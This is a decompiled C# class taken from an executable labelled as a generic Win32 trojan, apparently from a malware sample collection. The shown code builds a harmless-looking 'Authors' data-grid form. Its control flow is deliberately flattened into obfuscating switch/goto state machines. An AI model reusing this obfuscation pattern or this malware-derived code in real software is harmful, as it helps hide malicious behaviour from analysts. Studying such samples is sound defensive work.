// Decompiled with JetBrains decompiler
// Type: ProjNet.Pools.DatabaseErrorPool
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using TYPELIBA.Identifiers;
using TYPELIBA.Wrappers;

namespace ProjNet.Pools
{
  public class DatabaseErrorPool : Form
  {
    private IContainer m_WrapperConsumer;
    private DataGridView _CustomerConsumer;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public DatabaseErrorPool()
    {
      int num1 = 1;
      if (DatabaseErrorPool.MoveCreator())
        goto label_5;
label_1:
      this._CustomerConsumer.DataSource = (object) MethodProcess.SortConsumer();
      int num2 = 6;
label_4:
      num1 = num2;
label_5:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_2;
          case 2:
            this.m_WrapperConsumer = (IContainer) null;
            // ISSUE: explicit constructor call
            base.\u002Ector();
            int num3 = 5;
            num1 = DatabaseErrorPool.UpdateCreator() ? num3 : num3;
            continue;
          case 3:
          case 4:
            goto label_1;
          case 5:
            goto label_3;
          case 6:
            goto label_8;
          default:
            goto label_6;
        }
      }
label_2:
      ManagerParamsID.NewExpression();
      num2 = 2;
      goto label_4;
label_3:
      this.InterruptError();
      goto label_1;
label_8:
      return;
label_6:
      num2 = 4;
      goto label_4;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RevertRepository(object init, EventArgs ord)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool taskopen)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              if (taskopen)
              {
                num2 = 2;
                continue;
              }
              goto label_4;
            case 1:
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 5:
              goto label_6;
            default:
              num2 = 3;
              continue;
          }
        }
label_1:
        this.m_WrapperConsumer.Dispose();
label_2:
        base.Dispose(taskopen);
        num1 = 5;
        continue;
label_3:
        int num3 = this.m_WrapperConsumer != null ? 1 : 0;
        goto label_5;
label_4:
        num3 = 0;
label_5:
        if (num3 == 0)
          goto label_2;
        else
          goto label_1;
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InterruptError()
    {
      int num1 = 9;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 9:
              goto label_1;
            case 1:
              this.AutoScaleDimensions = new SizeF(6f, 13f);
              this.AutoScaleMode = AutoScaleMode.Font;
              this.AutoSize = true;
              this.ClientSize = new Size(227, 140);
              this.Controls.Add((Control) this._CustomerConsumer);
              this.Name = "ReadAuthorChildForm";
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_10;
            case 2:
            case 6:
              goto label_11;
            case 3:
              this._CustomerConsumer.Location = new Point(0, 0);
              this._CustomerConsumer.Name = "dataGridView";
              this._CustomerConsumer.ReadOnly = true;
              this._CustomerConsumer.Size = new Size(227, 140);
              this._CustomerConsumer.TabIndex = 0;
              goto case 1;
            case 4:
              this._CustomerConsumer.Dock = DockStyle.Fill;
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_4;
            case 5:
              goto label_2;
            case 7:
              goto label_4;
            case 8:
              goto label_10;
            case 10:
              goto label_12;
            default:
              num2 = 1;
              continue;
          }
        }
label_1:
        this._CustomerConsumer = new DataGridView();
        num1 = 5;
        continue;
label_2:
        ((ISupportInitialize) this._CustomerConsumer).BeginInit();
        this.SuspendLayout();
        this._CustomerConsumer.AllowUserToAddRows = false;
        this._CustomerConsumer.AllowUserToDeleteRows = false;
        this._CustomerConsumer.AllowUserToResizeColumns = false;
        this._CustomerConsumer.AllowUserToResizeRows = false;
        num1 = 6;
        continue;
label_4:
        this.Text = "Authors";
        ((ISupportInitialize) this._CustomerConsumer).EndInit();
        num1 = 8;
        continue;
label_10:
        this.ResumeLayout(false);
        num1 = 10;
        continue;
label_11:
        this._CustomerConsumer.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
        this._CustomerConsumer.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
        this._CustomerConsumer.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
        num1 = 4;
      }
label_12:;
    }

    internal static bool MoveCreator() => true;

    internal static bool UpdateCreator() => false;
  }
}
